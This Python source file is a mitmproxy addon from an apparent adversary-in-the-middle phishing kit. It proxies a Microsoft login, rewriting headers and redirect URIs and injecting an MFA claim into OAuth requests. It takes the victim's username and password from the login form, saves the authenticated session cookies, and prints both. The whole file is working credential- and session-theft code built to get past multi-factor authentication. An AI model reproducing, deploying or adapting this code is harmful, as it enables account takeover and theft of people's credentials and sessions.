import json
from http.cookies import SimpleCookie
from mitmproxy.http import HTTPFlow
from aitm.aitm_config import MFA_CLAIM, AUTH_URL
from aitm.helpers import requests, responses, cookies


class ModifierAddon:
    credentials = {}
    simple_cookie = SimpleCookie()

    def request(self, flow: HTTPFlow) -> None:
        requests.modify_header(flow, "Host")
        requests.modify_header(flow, "Referer")
        requests.modify_header(flow, "Origin")
        requests.modify_header(flow, "Location")
        requests.modify_query(flow, "redirect_uri")

        if flow.request.path.startswith("/common/oauth2/v2.0/authorize"):
            flow.request.query["claims"] = MFA_CLAIM
        if flow.request.path.startswith("/common/login"):
            self.credentials["login"] = flow.request.urlencoded_form["login"]
            self.credentials["passwd"] = flow.request.urlencoded_form["passwd"]

    def response(self, flow: HTTPFlow) -> None:
        responses.modify_header(flow, "Location")
        responses.save_cookies(flow, self.simple_cookie)
        responses.modify_cookies(flow)
        responses.modify_content(flow)

        if flow.request.path in AUTH_URL:
            print(json.dumps(cookies.parse_cookies(self.simple_cookie)))
            print(self.credentials)
